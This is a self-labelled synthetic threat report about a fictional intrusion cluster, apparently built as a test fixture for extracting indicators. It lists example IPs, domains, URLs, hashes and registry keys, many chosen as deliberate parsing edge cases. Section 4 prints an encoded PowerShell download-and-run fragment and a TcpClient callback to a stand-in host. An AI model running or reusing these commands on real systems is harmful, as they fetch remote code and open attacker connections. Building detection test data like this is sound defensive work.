TLP:RED - SYNTHETIC TRAINING MATERIAL. NOT REAL INTELLIGENCE. DO NOT REDISTRIBUTE.

# Notional Threat Report: SALT MERIDIAN cluster, wave 2

Report ID: NTR-2025-0719 | Handling: TLP:RED | Prepared by: Notional CTI Cell | 2025-07-22

## 1. Summary

The SALT MERIDIAN cluster (notional) exploited CVE-2025-21298 on internet-facing mail relays and attempted
cve-2025-0133 against a management portal. A malformed identifier (CVE-2025-1) appeared in the vendor's own
advisory. Reference: https://nvd.nist.gov/vuln/detail/CVE-2025-21298 (retrieved 2025-07-20).

Reporting reached our İSTANBUL desk first; the Japanese summary reads 標的型攻撃の初期侵入. Operators used a
phishing page at café-login.example and a look-alike CDN at exam​ple.com (note: the name contains a zero-width space).

## 2. Network infrastructure

IPv6 was preferred. Beacons reached 2001:db8:dead:beef::1 and, when that failed, [2001:db8:dead:beef::1]:8443.
A second implant used the IPv4-mapped form ::ffff:203.0.113.9. Host enumeration came from fe80::1%eth0 on the
local segment, and the operator advertised 2001:db8::/32 as their range.

IPv4 callbacks: 198.51.100.41,198.51.100.42 and a sweep across 198.51.100.10-198.51.100.20. An exfiltration
share was mounted from \\198.51.100.5\payload$. One log line recorded the padded form 192.000.002.033, and a
firmware string reported version 9.0.0.1. The staging subnet 203.0.113.0/24 was scanned twice.

🧨 203.0.113.77 hosted the loader and stayed online after remediation.

## 3. Domains and URLs

| Type | Indicator | Notes |
| --- | --- | --- |
| Domain | mail-relay.example.org | primary C2 |
| Domain | CDN.EXAMPLE.ORG | mixed case in source |
| Domain | exfil.example.net. | trailing dot (fully qualified) |
| Domain | _dmarc.example.com | TXT record abused for tasking |
| Domain | a.b.c.d.e.f.deep.example.org | deeply nested |
| Domain | xn--80ak6aa92e.com | punycode in the original |
| Domain | upd4te[.]example[.]net | defanged |
| URL | https://mail-relay.example.org/owa/auth/logon.aspx?url=/ews | credential capture |
| URL | HTTPS://CDN.EXAMPLE.ORG/pkg/v2/loader.bin | uppercase scheme and host |
| URL | https://203.0.113.77:8443/s/7f2a#stage2 | IP literal, port, fragment |
| URL | https://mail-relay.example.org/отчёт/2025 | non-ASCII path |
| URL | hxxps://upd4te[.]example[.]net/t/9 | defanged |

Analysts should also review the [vendor advisory](https://psirt.example.com/2025/07/ms-relay.html), the mirror
at https://mirror.example.net/a/b/c., and https://mail-relay.example.org/owa/auth/logon.aspx?url=/ews again
(the same URL appears twice in this report).

Credentials were posted to https://collector:s3cr3t@drop.example.org/upload (userinfo present).

## 4. Files and fingerprints

| Type | Value | Notes |
| --- | --- | --- |
| SHA-256 | 3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c | loader.bin |
| SHA-256 (wrapped) | 9c8b7a6d5e4f3a2b1c0d9e8f7a6b5c4d | continued on the next line |
| | 3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b | (same hash, wrapped by the PDF export) |
| SHA-1 | da39a3ee5e6b4b0d3255bfef95601890afd80709 | empty-file marker |
| MD5 (JA3) | 51c64c77e60f3980eea90869b68c58a8 | TLS client fingerprint |
| SHA-512 | 9b71d224bd62f3785d96d46ad3ea3d73319bfbc2890caadae2dff72519673ca72323c3d99ba5c11d7c7acc6e14b8c5da0c4663475c2e5c3adef46f73bcdec043 | archive |
| Docker | sha256:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b | poisoned image layer |

Mutex: Global\SaltMeridian2025. Registry: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\relaysvc.
Dropped files: relaysvc.dll, loader.bin, report.docx, setup.msi. Wallet: bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq.

```
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
$c = [System.Net.Sockets.TcpClient]::new('198.51.100.41', 8443)
```

Contact for takedown requests: abuse@mail-relay.example.org (do not notify the operator).

## 5. Notes

The same beacon address 203.0.113.77 appears in sections 2, 3 and 5 so that repeated mentions can be reviewed
as separate evidence spans. ATT&CK: T1566.002, T1114.002, T1041.
